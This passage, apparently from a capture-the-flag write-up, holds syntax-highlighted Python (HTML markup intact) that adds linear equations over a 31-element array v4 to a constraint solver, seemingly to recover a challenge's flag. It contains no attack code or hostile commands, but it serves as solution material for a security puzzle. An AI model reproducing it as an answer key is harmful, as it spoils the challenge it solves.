number">217</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">112</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">113</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">278</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">255</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">241</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">356</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">470065</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">369</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">231</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">285</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">290</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">297</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">189</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">390</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">345</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">153</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">114</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">251</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">340</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">335</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">359</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">392</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">181</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">103</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">229</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">175</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">208</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">397</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">349</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">356</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">295</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">661276</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">341</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">374</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">283</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">213</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">392</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">224</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">386</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">298</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">170</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">247</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">204</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">103</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">159</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">192</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">213</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">361</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">555288</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">106</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">363</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">171</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">289</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">240</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">164</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">342</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">391</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">304</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">218</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">350</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">339</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">298</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">264</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">113</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">275</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">345</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">312</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">171</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">384</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">175</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">113</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">263</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">637650</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">278</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">169</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">119</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">385</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">289</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">344</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">308</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">318</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">323</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">332</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">170</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">163</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">301</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">327</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">169</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">365</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">352</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">140</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">346</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">572609</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">147</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">143</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">237</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">281</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">388</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">208</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">354</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">146</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">290</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">349</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">230</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">267</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">136</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">383</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">226</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">385</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">238</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">348</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">249</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">343</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">603481</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">29</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">323</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">159</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">118</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">326</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">211</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">355</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">149</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">296</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">184</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">315</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">364</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">313</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">396</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">348</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">272</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">206</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">173</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">155</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">144</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">366</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">257</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">148</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">253</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span 